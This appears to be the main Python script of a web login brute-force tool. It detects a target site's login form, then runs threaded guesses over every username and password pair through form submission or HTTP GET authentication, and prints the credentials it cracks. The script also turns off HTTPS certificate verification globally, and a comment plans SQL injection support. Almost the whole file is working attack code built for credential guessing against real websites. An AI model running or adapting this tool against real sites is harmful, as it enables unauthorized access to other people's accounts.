#!/usr/bin/python

# def check_import():
# 	try:
# 		import sys, threading, os, ssl, time
# 		import requests, mechanize, re

# 	except ImportError as error:
# 		print(error)
# 		print("Please install libraries")
# 		return False

# 	try:
# 		from core import actions, utils, tbrowser, options
# 		from modules import loginbrute, httpget
# 		from extras import getproxy, reauth
# 		import data, reports
	
# 	except Exception as error:
# 		print("Can't find project's module")
# 		print(error)
# 		return False

# TODO use zip loop for SQL injection

def checkTarget(opts):
	if opts.attack_mode != "--httpget":
		try:
			proc = tbrowser.startBrowser()
			utils.printf("[+] Checking connection...")

			proc.open(opts.url)

			"""
				Check URL type. If Website directs to other URL,
				options.url is website's panel
				else: it is login url.
				Example: options.url = site.com/wp-admin/ -> panel
					site directs user to wp-login -> login URL
					options.url = site.com/wp-login.php -> login URL
			"""
			if proc.geturl() != opts.url:
				utils.printf("[*] Website moves to: ['%s']" %(proc.geturl()), "norm")
				opts.panel_url, opts.login_url = opts.url, proc.geturl()
			else:
				opts.login_url = opts.url


			if opts.run_options["--verbose"]:
				utils.printf("[*] %s" %(proc.title()), "good")
			utils.printf("[+] Connect success! Analyzing login form....")
			loginInfo = tbrowser.parseLoginForm(proc.forms())
		
		except Exception as error:
			utils.die("[x] Runtime error: Target analyzing error!", error)
		
		finally:
			proc.close()
			try:
				return loginInfo
			except:
				return None

def _http_get(options):
	from modules import httpget
	import Queue
	result = Queue.Queue()

	sending, completed = 0, 0

	# TODO add check login

	try:
		tasks = actions.size_o(options.passwd) * actions.size_o(options.username)
		utils.printf("[+] Task counts: %s tasks" %(tasks))

		workers = []

		for username in options.username:
			for password in options.passwd:
				if actions.size_o(workers) == options.threads:
					sending, completed = run_threads(workers, sending, completed, tasks)
					del workers[:]

				worker = threading.Thread(
					target = httpget.submit,
					args = (options, username, password, result)
				)
				workers.append(worker)
				worker.daemon = True

		sending, completed = run_threads(workers, sending, completed, tasks)
		del workers[:]

	except KeyboardInterrupt:
		if threading.activeCount() > 1:
			utils.printf("[x] Terminated by user!", "bad")
			import os
			os._exit(0)
		

	except SystemExit:
		utils.printf("[x] Terminated by system!", "bad")

	except Exception as error:
		utils.die("[x] Runtime error", error)

	finally:
		credentials = list(result.queue)
		if actions.size_o(credentials) == 0:
			utils.printf("[-] No match found!", "bad")
						
		else:
			utils.printf(
				"\n[*] %s valid password[s] found:\n" %(actions.size_o(credentials)),
				"norm"
			)
			utils.print_table(("Username", "Password"), *credentials)
			utils.printf("")
		return credentials

def _login_brute(options):
	import Queue
	result = Queue.Queue()
	loginInfo = checkTarget(options)

	if not loginInfo:
		utils.die("[x] URL error", "No login form")

	else:
		sending, completed = 0, 0
		try:
			from modules import loginbrute

			### SETTING UP FOR NEW ATTACK ###

			## 1 PASSWORD FORM FIELD ONLY ## 
			if actions.size_o(loginInfo[1]) == 1:
				tasks = actions.size_o(options.passwd)

				#if options.verbose:
				utils.printf("[*] Form ID: %s\n  [*] Password field: %s" %(loginInfo[0], loginInfo[1][0]), "good")

				utils.printf("[+] Login form detected! Starting attack...")
				utils.printf("[+] Task counts: %s tasks" %(tasks))
				
				del options.username[:]
				options.username = [""]
			
			## FORM FIELD WITH BOTH USERNAME AND PASSWORD ## 
			else:#elif: actions.size_o(loginInfo[1]) == 2:

				tasks = actions.size_o(options.passwd) * actions.size_o(options.username)

				#if options.verbose:
				utils.printf("[*] Form ID: %s\n"
					"   [*] Username field: %s\n"
					"   [*] Password field: %s"
					%(loginInfo[0], loginInfo[1][1], loginInfo[1][0]), "good")

				utils.printf("[+] Login form detected! Starting attack...")
				utils.printf("[+] Task counts: %s tasks" %(tasks))

			#### START ATTACK ####
			workers = []

			for username in options.username:
				for password in options.passwd:
					if actions.size_o(workers) == options.threads:
						sending, completed = run_threads(workers, sending, completed, tasks)
						del workers[:]

					worker = threading.Thread(
						target = loginbrute.submit,
						args = (options, loginInfo, [password, username], result)
					)
					workers.append(worker)
					worker.daemon = True

			sending, completed = run_threads(workers, sending, completed, tasks)
			del workers[:]
				
		except KeyboardInterrupt:
			if threading.activeCount() > 1:
				utils.printf("[x] Terminated by user!", "bad")
				import os
				os._exit(0)
			

		except SystemExit:
			utils.printf("[x] Terminated by system!", "bad")

		except Exception as error:
			utils.die("[x] Runtime error", error)

		finally:
			credentials = list(result.queue)
			if actions.size_o(credentials) == 0:
				utils.printf("[-] No match found!", "bad")

			else:
				utils.printf(
					"\n[*] %s valid password[s] found:\n" %(
						actions.size_o(credentials)
					),
					"norm"
				)

				if "--reauth" not in options.extras:
					if actions.size_o(loginInfo[1]) == 1:
						utils.print_table(("", "Password"), *credentials)
					else:
						utils.print_table(("Username", "Password"), *credentials)
				else:
					utils.print_table(("Target", "Username", "Password"), *credentials)
				utils.printf("")
			return credentials


if __name__ == "__main__":
	#if check_import():
		# IMPORT GLOBALY
	import sys, time, threading, ssl
	from core import utils, options, actions, tbrowser

	try:
		# Setting new session
		runtime = time.time()
		reload(sys)
		sys.setdefaultencoding('utf8')

		# Get options
		options = options.ParseOptions()

		if options.help == True:
			from core import helps
			helps.print_help()
		else:
			actions.verify_url(options)

			actions.verify_options(options)

			# Print start banner
			utils.printf(utils.start_banner(options))
			
			# Fix SSL errors https://stackoverflow.com/a/35960702
			try:
				_create_unverified_https_context = ssl._create_unverified_context
			except AttributeError:
			# Legacy Python that doesn't verify HTTPS certificates by default
				pass
			else:
			# Handle target environment that doesn't support HTTPS verification
				ssl._create_default_https_context = _create_unverified_https_context
			
			
			# Ready options
			# check user options, mix it together to start attack
			# BUG does not get new proxy list
			if "--getproxy" in options.extras:
				from extras import getproxy
				getproxy.main(options)

			else:
				def run_threads(threads, sending, completed, total):
					# Run threads
					for thread in threads:
						sending += 1 # Sending
						utils.progress_bar(sending, completed, total)
						thread.start()

					# Wait for threads completed
					for thread in threads:
						completed += 1
						utils.progress_bar(sending, completed, total)
						thread.join()

					return sending, completed

				if options.attack_mode != "--httpget":
					result = _login_brute(options)
				else:
					result = _http_get(options)

			if "--reauth" in options.extras:
				from extras import reauth
				reauth.run(options, result)
			# Report

	except Exception as error:
		utils.die("[x] Program stopped", error)

	finally:
		runtime = time.time() - runtime
		utils.printf("\n[*] Time elapsed: %0.4f [s]\n" %(runtime), "good")